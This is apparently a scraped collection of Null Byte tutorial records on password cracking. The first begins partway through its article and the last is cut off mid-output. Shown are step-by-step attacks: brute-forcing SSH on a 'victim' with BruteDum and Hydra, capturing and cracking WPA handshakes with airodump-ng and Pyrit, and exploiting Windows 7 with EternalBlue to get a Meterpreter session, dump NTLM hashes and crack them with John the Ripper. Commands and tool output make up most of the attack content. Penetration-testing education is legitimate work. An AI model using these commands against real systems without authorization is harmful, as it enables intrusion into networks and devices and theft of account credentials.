Need\nTo follow this guide, you'll need Python3 installed on your system. Also, I recommend using Kali Linux, as it should have most of the required programs installed by default. If you're doing this on another system, you'll need to make sure that you have all the prerequisite programs installed.\nIf you're not using Kali Linux, you can use Ubuntu or Debian, but you'll need to make sure you have Hydra, Medusa, and Ncrack installed. You'll also need Nmap for scanning.\nWe'll also need a password list to test, and in this case, we'll be downloading it to a folder we create later. If you have a favorite password list, you'll need to copy it to the folder we'll be making.\nStep 1: Download & Set Up BruteDum\nTo get started, we'll need to download the repository from GitHub. In a new terminal window, you can type in the following command to clone the repo.\n~$ git clone https://github.com/GitHackTools/BruteDum\nCloning into 'BruteDum'...\nremote: Enumerating objects: 15, done.\nremote: Counting objects: 100% (15/15), done.\nremote: Compressing objects: 100% (14/14), done.\nremote: Total 15 (delta 2), reused 0 (delta 0), pack-reused 0\nUnpacking objects: 100% (15/15), done.\nAnd this one to navigate into the directory:\n~$ cd BruteDum\nFrom inside this folder, you'll be able to run BruteDum. Before we do, we should take care of one small quirk. I found that BruteDum couldn't find password lists saved outside the BruteDum folder, so the solution seems to be adding our password list directly there. To do this, I'll simply take one off GitHub, and I'll download it to the folder I'm in using the wget command.\n~/BruteDum$ wget https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top207-probable-v2.txt\n--2020-01-10 17:19:59--  https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top207-probable-v2.txt\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1620 (1.6K) [text/plain]\nSaving to: ‘Top207-probable-v2.txt’\nTop207-probable-v2. 100%[===================>]   1.58K  --.-KB/s    in 0s\n2020-01-10 17:19:59 (53.3 MB/s) - ‘Top207-probable-v2.txt’ saved [1620/1620]\nOnce it's done, we can run BruteDum by typing the following command.\n~/BruteDum$ python3 brutedum.py\n888888                           888888                BRUTE\n8    8   eeeee  e   e eeeee eeee 8    8 e   e eeeeeee  FORCE\n8eeee8ee 8   8  8   8   8   8    8e   8 8   8 8  8  8  JUST\n88     8 8eee8e 8e  8   8e  8eee 88   8 8e  8 8e 8  8  FOR\n88     8 88   8 88  8   88  88   88   8 88  8 88 8  8  THE\n88eeeee8 88   8 88ee8   88  88ee 88eee8 88ee8 88 8  8  DUMMIES\n[i] BruteDum - Brute Force attacks SSH, FTP, Telnet, PostgreSQL, RDP, VNC with Hydra, Medusa and Ncrack\nAuthor: https://GitHackTools.blogspot.com\n[?] Enter the victim address:\nStep 2: Enter the Target Address\nAfter the loading screen finishes, we'll need to enter the IP address of the victim. Once you've done so, press Enter, and you'll be presented with the option to run an Nmap scan. It's a handy feature that can help you discover other services open on the same device. Type Y and hit Enter to run the Nmap scan.\n[?] Enter the victim address: 192.168.43.1\n[?] Do you want to scan victim's ports with Nmap? [Y/n]: Y\nWhen the results return, you should be able to identify any ports that come back as \"open.\" Next, you'll need to select a service to crack. The menu for doing so is quite easy to understand, and you can choose one that matches the service that our Nmap scan discovered.\n[+] Scanning ports with Nmap...\nStarting Nmap 7.70 ( https://nmap.org ) at 2020-01-10 02:57 PDT\nNmap scan report for 192.168.43.1\nHost is up (0.0087s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: ███.███.███.███.███.███\nNmap done: 1 IP address (1 host up) scanned in 0.95 seconds\n[1] FTP                       [2] Telnet\n(Default port is 21)          (Default port is 23)\n[3] PostgreSQL                [4] SSH\n(Default port is 5432)        (Default port is 22)\n[5] RDP                       [6] VNC\n(Default port is 3389)        (Default port is 5900)\n[?] Which protocol do you want to crack? [1-6]: 4\nIn our example, we'll select option 4 and hit Enter to indicate we want to do SSH cracking.\nStep 3: Select the Tool\nNow, we'll need to determine the tool we'll be using to try cracking the password. Depending on what service we selected, BruteDum will recommend one to use.\n888888                           888888                BRUTE\n8    8   eeeee  e   e eeeee eeee 8    8 e   e eeeeeee  FORCE\n8eeee8ee 8   8  8   8   8   8    8e   8 8   8 8  8  8  JUST\n88     8 8eee8e 8e  8   8e  8eee 88   8 8e  8 8e 8  8  FOR\n88     8 88   8 88  8   88  88   88   8 88  8 88 8  8  THE\n88eeeee8 88   8 88ee8   88  88ee 88eee8 88ee8 88 8  8  DUMMIES\n[i] BruteDum - Brute Force attacks SSH, FTP, Telnet, PostgreSQL, RDP, VNC with Hydra, Medusa and Ncrack\nAuthor: https://GitHackTools.blogspot.com\n[i] Target: 192.168.43.1\nProtocol: ssh\n[2] Hydra (Recommended)\n[?] Which tool do you want to use? [1-3]: 2\nWe'll select Hydra, as it's the one recommended for cracking SSH. Type 2 to indicate Hydra (or the number of the tool you wish to use) and press Enter to begin configuring it.\nStep 4: Set Username & Password Lists\nTo launch our attack, we'll need to make a time versus probability tradeoff. Our first option will be to select a username list. That means we'll be trying every password in our password list with every username in our username list. It can become a lot of attempts very quickly.\nIn our example, we can select N to decline using a username list. Instead, we'll use a common username, or one we might know exists by default on the type of device.\n[i] Target: 192.168.43.1\nProtocol: ssh\n[?] Do you want to use username list? [Y/n]: N\nBecause we declined to supply a username list, we'll have to enter one manually instead. Here, I'll enter toor, as I know that's the username for our test device.\n[?] Enter the username: toor\nNext, we'll need to set the password list. It won't work if we select a password list outside of the directory we're in, so we can now add the password list we downloaded earlier. If you followed along before, we should be able to just paste in the Top207-probable-v2.txt wordlist here.\n[?] Enter the path of wordlist: Top207-probable-v2.txt\n* Don't Miss: Use the Buscador OSINT VM for Conducting Online Investigations\nStep 5: Launch the Attack\nFinally, we can decide if we want to use the default port or not. Some devices may host services on a port other than the standard one, but this isn't very common. For SSH, the default port is 22, so we'll just enter Y and hit Enter.\n[?] Do you want to use default port? [Y/n]: Y\nIf you're attacking a service on a non-standard port, you can specify it here and press Enter. Do not accidentally type in the number of the port you want to attack here, as the script will crash.\nAs soon as you supply the port, BruteDum will launch the tool you specified.\n[i] Target: 192.168.43.1\nProtocol: ssh\n[+] Hydra is cracking...\nHydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-10 09:23:30\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 208 login tries (l:1/p:208), ~13 tries per task\n[DATA] attacking ssh://192.168.43.1:22/\nAfter some time to attack the network and try all of the passwords, you'll get a result, either revealing the password or reporting that a valid password was not found.\n[22][ssh] host: 192.168.43.1   login: toor   password: root\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 3 final worker threads did not complete until end.\n[ERROR] 3 targets did not resolve or could not be connected\n[ERROR] 16 targets did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-10 10:51:18\n[?] Do you want to conitnue? [Y/n]: N\nBrute-Force Attacks Find Weak Passwords\nA key thing to remember about brute-force and dictionary attacks is that they are powerful in the right place, but not a silver bullet for breaking into accounts. Weak passwords are especially easy to find with BruteDum, but more complicated passwords require longer password lists. That issue necessitates prolonged contact with the victim to burn through those longer lists, making the attack less practical and more evident to anyone watching for this kind of attack.\nAn ideal target for these attacks is primarily IoT devices, which generally have poor security and a plethora of services running with default credentials.\nI hope you enjoyed this guide to brute-forcing weak login credentials with BruteDum! If you have any questions about this tutorial on brute-forcing frameworks or you have a comment, there's the comments section below, and feel free to reach me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by Kody/Null Byte",
        "category": "Password Cracking"
    },
    {
        "title": "Crack WPA & WPA2 Wi-Fi Passwords with Pyrit",
        "link": "https://null-byte.wonderhowto.com/how-to/crack-wpa-wpa2-wi-fi-passwords-with-pyrit-0196782/",
        "content": "* Buy a D1 Mini MCU on AliExpress\nImage by Kody/Null Byte\nFinally, plug each device into a Micro-USB power source, then connect a jumper wire from pin D7 to ground on only one of them. The ESP8266 without pin D7 connected to ground will create a Wi-Fi network named \"Chicken Easy\" with a number at the end. The second device with pin D7 connected to ground will join the Wi-Fi network that the first one created, generating WPA handshakes for you to capture and crack easily.\nIn our game today, we'll be trying to connect to an encrypted Wi-Fi access point with a WPA/WPA2 password we don't know. We'll do this in a few steps, using airodump-ng to grab the handshake, and Pyrit to crack the password.\n* Don't Miss: Cracking WPA2 Passwords Using the New PMKID Hashcat Attack\nStep 1: Install Pyrit\nTo install Pyrit on a Kali system, type apt install pyrit in a terminal window. Pyrit is installed by default on full Kali installs, but for the lite version, you may need to install it manually.\n~$ apt install pyrit\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\npyrit is already the newest version (0.5.1+git20180801-1).\npyrit set to manually installed.\nThe following package was automatically installed and is no longer required:\nUse 'apt autoremove' to remove it.\n0 upgraded, 0 newly installed, 0 to remove and 1795 not upgraded.\nOnce it's finished installing, type pyrit -h to print the help menu and confirm it's installed on our system.\n~$ pyrit -h\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\nUsage: pyrit [options] command\nRecognized options:\n-b               : Filters AccessPoint by BSSID\n-e               : Filters AccessPoint by ESSID\n-h               : Print help for a certain command\n-i               : Filename for input ('-' is stdin)\n-o               : Filename for output ('-' is stdout)\n-r               : Packet capture source in pcap-format\n-u               : URL of the storage-system to use\n--all-handshakes : Use all handshakes instead of the best one\n--aes            : Use AES\nRecognized commands:\nanalyze                 : Analyze a packet-capture file\nattack_batch            : Attack a handshake with PMKs/passwords from the db\nattack_cowpatty         : Attack a handshake with PMKs from a cowpatty-file\nattack_db               : Attack a handshake with PMKs from the db\nattack_passthrough      : Attack a handshake with passwords from a file\nbatch                   : Batchprocess the database\nbenchmark               : Determine performance of available cores\nbenchmark_long          : Longer and more accurate version of benchmark (5 minutes)\ncheck_db                : Check the database for errors\ncreate_essid            : Create a new ESSID\ndelete_essid            : Delete a ESSID from the database\neval                    : Count the available passwords and matching results\nexport_cowpatty         : Export results to a new cowpatty file\nexport_hashdb           : Export results to an airolib database\nexport_passwords        : Export passwords to a file\nhelp                    : Print general help\nimport_passwords        : Import passwords from a file-like source\nimport_unique_passwords : Import unique passwords from a file-like source\nlist_cores              : List available cores\nlist_essids             : List all ESSIDs but don't count matching results\npassthrough             : Compute PMKs and write results to a file\nrelay                   : Relay a storage-url via RPC\nselftest                : Test hardware to ensure it computes correct results\nserve                   : Serve local hardware to other Pyrit clients\nstrip                   : Strip packet-capture files to the relevant packets\nstripLive               : Capture relevant packets from a live capture-source\nverify                  : Verify 10% of the results by recomputation\nWhat We'll End Up With\nFor our attack, we'll be using the attack_batch option, and we'll need a couple of pieces of information for the command to work.\nFirst, we need to include a capture file that our WPA/WPA2 handshake is saved in. We'll add it by adding the -r flag, with the location of the file containing our handshake directly after. Next, we'll need to add a list of passwords to Pyrit, which we can do with the import_unique_passwords command and the -i flag to indicate the password list we want to add. We'll be using a WPA password list from the SecLists GitHub repository. Finally, we'll be using the -o flag to save the password to a file.\nOur final command should look something like this when we're ready:\n~$ pyrit -r capture.pcap -o savedpass attack_batch\nBefore we can execute the attack, however, we'll need to grab the handshake and the password list, so let's grab those first.\n* Don't Miss: Capturing WPA Passwords by Targeting Users with a Fluxion Attack\nStep 2: Download a Password List & Benchmark System\nFor our password list, we're going to download the excellent WPA cracking wordlist hosted at the SecList GitHub repository. To download it to our Desktop, type the following commands into a terminal window.\n~$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt\n--2019-12-20 13:19:39--  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 45276 (44K) [text/plain]\nSaving to: ‘probable-v2-wpa-top4800.txt’\nprobable-v2-wpa-top 100%[===================>]  44.21K  --.-KB/s    in 0.07s\n2019-12-20 13:19:39 (627 KB/s) - ‘probable-v2-wpa-top4800.txt’ saved [45276/45276]\nWhen it's complete, we should have a password list of 4,800 of the worst passwords out there to start with, downloaded to our desktop. To know how quickly we'll be able to crack through them, we'll need to benchmark our system with Pyrit. To do so, type pyrit benchmark into a terminal window and wait while it completes.\n~$ pyrit benchmark\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\nRunning benchmark (1157.3 PMKs/s)... |\nComputed 1157.32 PMKs/s total.\n#1: 'CPU-Core (SSE2/AES)': 298.2 PMKs/s (RTT 2.9)\n#2: 'CPU-Core (SSE2/AES)': 312.0 PMKs/s (RTT 3.0)\n#3: 'CPU-Core (SSE2/AES)': 312.6 PMKs/s (RTT 2.7)\n#4: 'CPU-Core (SSE2/AES)': 310.5 PMKs/s (RTT 3.0)\nHere, we can see that my rather old Lenovo can try about 1,157.3 PMKs per second, meaning it would take about 4.1 seconds to try every password in the file. Compare that to a new Macbook Pro with 4,226 PMKs per second, and you see how CPU power matters when it comes to cracking.\nLet's add our passwords to the database with the import_passwords command, adding -i and the path to the password list we want to add. Type the following command into your terminal window, modifying the password list to match where you saved yours.\n~$ pyrit -i '/root/Desktop/probable-v2-wpa-top4800.txt' import_passwords\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\nConnecting to storage at 'file://'...  connected.\n4800 lines read. Flushing buffers....\nNow we have 4,800 passwords saved in Pyrit's database, and we can use the attack_batch option.\nStep 3: Capture a WPA/WPA2 Handshake\nTo capture a handshake, we'll need to listen in on one device connecting to our target Wi-Fi network. First, let's put our card into wireless monitor mode so that we can listen in on handshake files.\n* Don't Miss: Hack WPA & WPA2 Wi-Fi Passwords Using Airgeddon\nFirst, open a terminal window and type ifconfig to locate the name of your wireless network adapter. If you're using an external USB adapter that's compatible with Kali, it will probably be named something like wlan1.\n~$ ifconfig\neth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500\nether 50:7b:9d:7a:c8:8a  txqueuelen 1000  (Ethernet)\nRX packets 0  bytes 0 (0.0 B)\nRX errors 0  dropped 0  overruns 0  frame 0\nTX packets 0  bytes 0 (0.0 B)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\ninet 127.0.0.1  netmask 255.0.0.0\ninet6 ::1  prefixlen 128  scopeid 0x10<host>\nloop  txqueuelen 1000  (Local Loopback)\nRX packets 856  bytes 71488 (69.8 KiB)\nRX errors 0  dropped 0  overruns 0  frame 0\nTX packets 856  bytes 71488 (69.8 KiB)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nwlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\ninet 192.168.0.37  netmask 255.255.255.0  broadcast 192.168.0.255\ninet6 2606:6000:66d0:a000:8991:f76f:faec:2713  prefixlen 64  scopeid 0x0<global>\ninet6 fe80::903f:322c:1ad9:a365  prefixlen 64  scopeid 0x20<link>\nether 30:52:cb:6b:76:5f  txqueuelen 1000  (Ethernet)\nRX packets 17933  bytes 22147581 (21.1 MiB)\nRX errors 0  dropped 0  overruns 0  frame 0\nTX packets 10045  bytes 1333343 (1.2 MiB)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nwlan1: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500\nether 00:c0:ca:95:6e:74  txqueuelen 1000  (Ethernet)\nRX packets 0  bytes 0 (0.0 B)\nRX errors 0  dropped 0  overruns 0  frame 0\nTX packets 0  bytes 0 (0.0 B)\nTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nNext, we'll put our card into wireless monitor mode with the command airmon-ng start wlan1. Airmon-ng is installed on Kali by default. When we run ifconfig again, our card should now be called \"wlan1mon.\" Now, let's grab a handshake.\nFirst, we'll run a scan to find what channel our target network is on. To do so, run airodump-ng wlan1mon. Again, you should already have airodump-ng.\n~$ airodump-ng wlan1mon\nCH 10 ][ Elapsed: 0 s ][ 2019-04-29 12:32\nBSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n18:FE:34:00:00:02  -40        4        0    0   3  48   WPA2 CCMP   PSK  Chicken_Easy_02\nWe can see our target network is on channel 3. Now that we know this, we can capture a handshake with the command airodump-ng wlan1mon -c 3 -w capture.\n~$ airodump-ng wlan1mon -c 3 -w capture\nWhen you've captured a handshake, you can confirm it with Pyrit. After copying the location of your capture file, run the command pyrit -r pathtocapturefile analyze to confirm you have a valid capture.\n~$ pyrit -r '/root/Desktop/capture-01.cap' analyze\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\nParsing file '/root/Desktop/marko-01.cap' (1/1)...\nParsed 122 packets (122 802.11-packets), got 8 AP(s)\n#1: AccessPoint 84:61:a0:61:39:90 ('ATT9X3s2e4'):\n#2: AccessPoint ce:50:e3:08:11:d4 ('Chicken_Easy_01'):\n#1: Station 84:0d:8e:8c:b0:1c, 4 handshake(s):\n#1: HMAC_SHA1_AES, good, spread 1\n#2: HMAC_SHA1_AES, good, spread 1\n#3: HMAC_SHA1_AES, good, spread 87\n#4: HMAC_SHA1_AES, good, spread 87\n#3: AccessPoint 6e:4d:73:96:78:a7 ('Edgardo'):\n#1: Station cc:29:f5:57:fc:98\n#4: AccessPoint c4:01:7c:57:69:a8 ('LILA-Guest'):\n#5: AccessPoint c4:01:7c:97:69:a8 ('LILA-STAFF'):\n#6: AccessPoint 6c:b0:ce:ad:1e:53 ('MyCharterWiFi53-2G'):\n#7: AccessPoint b0:98:2b:4a:b4:d4 ('MySpectrumWiFice-2G'):\n#8: AccessPoint c4:01:7c:17:69:a8 ('PS-WL-MO'):\nHere, we can see that we have good handshakes, meaning we can proceed with cracking.\nStep 4: Run Pyrit on the Handshake\nNow that we've captured the handshake and added the passwords to the database, we can run our attack_batch command we created before. Run the command pyrit -r pathtocapturefile -o savedpass attack_batch to try cracking handshakes we captured.\n~$ pyrit -r '/root/Desktop/capture-01.cap' -o savedpass attack_batch\nPyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora\nhttps://github.com/JPaulMora/Pyrit\nThis code is distributed under the GNU General Public License v3+\nParsing file '/root/Desktop/capture-01.cap' (1/1)...\nParsed 122 packets (122 802.11-packets), got 8 AP(s)\nPicked AccessPoint ce:50:e3:08:11:d4 ('Chicken_Easy_01') automatically.\nTried 447 PMKs so far; 250 PMKs per second. password\nThe password is '123456789'.\nSuccess! If you're playing our Wi-Fi hacking CTF game, you can log into the Wi-Fi access point, navigate to 192.168.4.1, and click on your team's color to claim the game piece for your team.\nIf you're not playing our game, then you just cracked the password to a WPA/WPA2 network, provided the password was on the list. If it wasn't, you might need a more extensive password list, even to try brute-forcing it.\nPyrit Makes It Easy to Brute-Force Passwords\nWhile we didn't go over everything Pyrit can do today, there is a lot we didn't cover. Of course, while Pyrit is one of the most potent brute-force attacks out there, an extremely strong password will still defeat the attack. Pyrit is capable of both dictionary and true brute-forcing attacks depending on what your system can handle, so make sure to pick strong passwords if you don't want to be vulnerable to easy cracking with tools like Pyrit.\nI hope you enjoyed this guide to brute-forcing passwords using Pyrit! If you have any questions about this tutorial on using your CPU and GPU to crack passwords using Pyrit, please ask below, and if you have a comment or idea for a future episode, feel free to reach me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo by Kody/Null Byte",
        "category": "Password Cracking"
    },
    {
        "title": "Use John the Ripper in Metasploit to Quickly Crack Windows Hashes",
        "link": "https://null-byte.wonderhowto.com/how-to/use-john-ripper-metasploit-quickly-crack-windows-hashes-0200322/",
        "content": "* WonderHowTo\nThere are many password-cracking tools out there, but one of the mainstays has always been John the Ripper. It's a powerful piece of software that can be configured and used in many different ways. Metasploit actually contains a little-known module version of JTR that can be used to quickly crack weak passwords, so let's explore it in an attempt to save precious time and effort.\nWe will be using an unpatched version Windows 7 as the target, so if you have a copy lying around, feel free to use it. The method of exploitation doesn't matter so much here, as long as you can get a Meterpreter session on the target. The John the Ripper module should work on any version of Windows we can grab the hashes from. In this tutorial, we will obtain the hash of an additional user that has logged onto the system (admin2).\n* Don't Miss: Get Root with Metasploit's Local Exploit Suggester\nStep 1: Compromise the PC\nTo begin, we will need to compromise the target and get a Meterpreter session. Since we know the target is running an unpatched version of Windows 7, we can use EternalBlue to quickly exploit the system from our Kali box.\nWe will need Metasploit's built-in database up and running for the John the Ripper module to work later, so start it with the following command:\n~# service postgresql start\nThen, fire up Metasploit by typing msfconsole in the terminal:\n~# msfconsole\n[-] ***rting the Metasploit Framework console.../\n[-] * WARNING: No database support: No database YAML file\n.                                         .\ndBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o\n'   dB'                     BBP\ndB'dB'dB' dBBP     dBP     dBP BB\ndB'dB'dB' dBP      dBP     dBP  BB\ndB'dB'dB' dBBBBP   dBP     dBBBBBBB\ndBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP\n.                  .                  dB' dBP    dB'.BP\n|       dBP    dBBBB' dBP    dB'.BP dBP    dBP\n--o--    dBP    dBP    dBP    dB'.BP dBP    dBP\n|     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP\no                  To boldly go where no\nshell has gone before\n=[ metasploit v5.0.20-dev                          ]\n+ -- --=[ 1886 exploits - 1065 auxiliary - 328 post       ]\n+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]\n+ -- --=[ 2 evasion                                       ]\nNext, load the EternalBlue exploit module with the use command:\nmsf5 > use exploit/windows/smb/ms17_010_eternalblue\nSet the appropriate options, and type run to launch:\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > run\n[*] Started reverse TCP handler on 10.10.0.1:1337\n[+] 10.10.0.104:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.0.104:445 - Connecting to target for exploitation.\n[+] 10.10.0.104:445 - Connection established for exploitation.\n[+] 10.10.0.104:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 10.10.0.104:445 - CORE raw buffer dump (42 bytes)\n[*] 10.10.0.104:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes\n[*] 10.10.0.104:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv\n[*] 10.10.0.104:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1\n[+] 10.10.0.104:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 10.10.0.104:445 - Trying exploit with 12 Groom Allocations.\n[*] 10.10.0.104:445 - Sending all but last fragment of exploit packet\n[*] 10.10.0.104:445 - Starting non-paged pool grooming\n[+] 10.10.0.104:445 - Sending SMBv2 buffers\n[+] 10.10.0.104:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 10.10.0.104:445 - Sending final SMBv2 buffers.\n[*] 10.10.0.104:445 - Sending last fragment of exploit packet!\n[*] 10.10.0.104:445 - Receiving response from exploit packet\n[+] 10.10.0.104:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 10.10.0.104:445 - Sending egg to corrupted connection.\n[*] 10.10.0.104:445 - Triggering free of corrupted buffer.\n[*] Sending stage (206403 bytes) to 10.10.0.104\n[*] Meterpreter session 1 opened (10.10.0.1:1337 -> 10.10.0.104:49212) at 2019-06-27 11:56:09 -0500\n[+] 10.10.0.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.0.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.0.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\nmeterpreter >\nWe now have a working Meterpreter session on the target.\nStep 2: Grab Some Hashes\nThe next thing we need to do is obtain the hashes of any users on the system. Meterpreter has an awesome feature called hashdump that will automatically dump the hashes for us:\nmeterpreter > hashdump\nadmin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nUnfortunately, all this does is display them on-screen. We need to save these to the database so the JTR module can work its magic. First, background the current session:\nmeterpreter > background\n[*] Backgrounding session 1...\nThen, we can use the hashdump post module to grab the hashes from our target. Load it with the use command:\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > use post/windows/gather/hashdump\nMetasploit post modules work by running on an existing session, which is why we need to background the session in the first place. We can type options to display the settings for the module:\nmsf5 post(windows/gather/hashdump) > options\nModule options (post/windows/gather/hashdump):\nName     Current Setting  Required  Description\n----     ---------------  --------  -----------\nSESSION                   yes       The session to run this module on.\nAll we need to do is specify the session number we want to run this on. Use the set command to set the session to 1 (or whatever session number that is running in the background):\nmsf5 post(windows/gather/hashdump) > set session 1\nsession => 1\nNow, simply type run and the module will gather the hashes:\nmsf5 post(windows/gather/hashdump) > run\n[*] Obtaining the boot key...\n[*] Calculating the hboot key using SYSKEY 1c8cfe9e1146578ee29d759b84a0ab70...\n[*] Obtaining the user list and keys...\n[*] Decrypting user keys...\n[*] Dumping password hints...\nadmin2:\"shots\"\n[*] Dumping password hashes...\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nadmin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::\n[*] Post module execution completed\nWe can see that we got the same hashes as before, but we also found a password hint for admin2. Nice. Now if we type creds at the prompt, Metasploit will display all the credentials that are currently stored in the database:\nmsf5 post(windows/gather/hashdump) > creds\nCredentials\n===========\nhost         origin       service        public         private                                                            realm  private_type  JtR Format\n----         ------       -------        ------         -------                                                            -----  ------------  ----------\n10.10.0.104  10.10.0.104  445/tcp (smb)  guest          aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm\n10.10.0.104  10.10.0.104  445/tcp (smb)  administrator  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm\n10.10.0.104  10.10.0.104  445/tcp (smb)  admin2         aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7         NTLM hash     nt,lm\nThis shows us the host, service, and associated credentials, as well as the hash type. Now all that's left to do is crack that hash.\nRecommended Reading: Metasploit Penetration Testing Cookbook, Third Edition\nStep 3: Crack the Hash\nMetasploit's John the Ripper module is extremely useful when you need to quickly crack hashes — without needing to bother loading up John externally. It is also useful to try as a first pass since it usually takes no time at all and could potentially uncover weak passwords.\nNow that we have our hashes stored in the database, load the JTR module with the use command:\nmsf5 post(windows/gather/hashdump) > use auxiliary/analyze/jtr_windows_fast\nWe can take a look at the available options for this module:\nmsf5 auxiliary(analyze/jtr_windows_fast) > options\nModule options (auxiliary/analyze/jtr_windows_fast):\nName                  Current Setting  Required  Description\n----                  ---------------  --------  -----------\nCONFIG                                 no        The path to a John config file to use instead of the default\nCUSTOM_WORDLIST                        no        The path to an optional custom wordlist\nITERATION_TIMEOUT                      no        The max-run-time for each iteration of cracking\nJOHN_PATH                              no        The absolute path to the John the Ripper executable\nKORELOGIC             false            no        Apply the KoreLogic rules to Wordlist Mode(slower)\nMUTATE                false            no        Apply common mutations to the Wordlist (SLOW)\nPOT                                    no        The path to a John POT file to use instead of the default\nUSE_CREDS             true             no        Use existing credential data saved in the database\nUSE_DB_INFO           true             no        Use looted database schema info to seed the wordlist\nUSE_DEFAULT_WORDLIST  true             no        Use the default metasploit wordlist\nUSE_HOSTNAMES         true             no        Seed the wordlist with hostnames from the workspace\nUSE_ROOT_WORDS        true             no        Use the Common Root Words Wordlist\nThere are options to use a custom wordlist or the powerful KoreLogic rules, but for now, we will keep the default options as they are. Type run to kick it off:\nmsf5 auxiliary(analyze/jtr_windows_fast) > run\n[*] Hashes Written out to /tmp/hashes_tmp20190627-25408-1bio0bp\n[*] Wordlist file written out to /tmp/jtrtmp20190627-25408-8tghjo\n[*] Cracking lm hashes in normal wordlist mode...\nUsing default input encoding: UTF-8\nUsing default target encoding: CP850\nWarning: poor OpenMP scalability for this hash type, consider --fork=4\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:00 DONE (2019-06-27 12:16) 0g/s 261783p/s 261783c/s 